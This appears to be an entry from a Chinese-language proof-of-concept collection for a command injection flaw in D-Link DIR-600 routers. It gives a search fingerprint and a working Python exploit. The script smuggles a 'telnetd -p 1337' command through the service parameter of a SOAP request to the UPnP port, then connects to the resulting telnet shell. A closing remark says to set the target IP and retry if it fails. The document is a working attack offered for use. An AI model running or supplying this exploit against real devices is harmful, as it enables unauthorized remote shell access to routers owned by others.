# D-linkDIR-600存在命令注入

- **系统**：D-linkDIR-600　|　**类型**：其他　|　**CVE**：—
- **指纹**：`body="DIR-600"`

**请求体 / payload**
```
from socket import *
from os import *
from time import *
####### configuration #######
host = '192.168.0.1'
upnp_port = 49152
shell_port = 1337
#############################
request = f"POST /soap.cgi?service=;telnetd -p {shell_port}; HTTP/1.1\r\n".encode()
request += f"Host: {host}:{upnp_port}\r\n".encode()
request += b"Content-Type: text/xml\r\n"
request += b"Content-Length: 100\r\n"
request += b"SOAPAction: \"urn:schemas-upnp-org:service:serviceType:v#actionName\"\r\n\r\n"
s = socket(AF_INET, SOCK_STREAM)
print(f"[*] Connecting to {host}:{upnp_port}")
s.connect((gethostbyname(host), upnp_port))
print("[*] Sending payload")
s.send(request)
print("[*] Waiting for the shell to be opened")
sleep(5)
print(f"[*] Connecting to shell on {host}:{shell_port}")
system(f'telnet {host} {shell_port}')
修改host为目标ip，会自己连了telnet。不成功多连打几次
```
- **预期**：200　|　—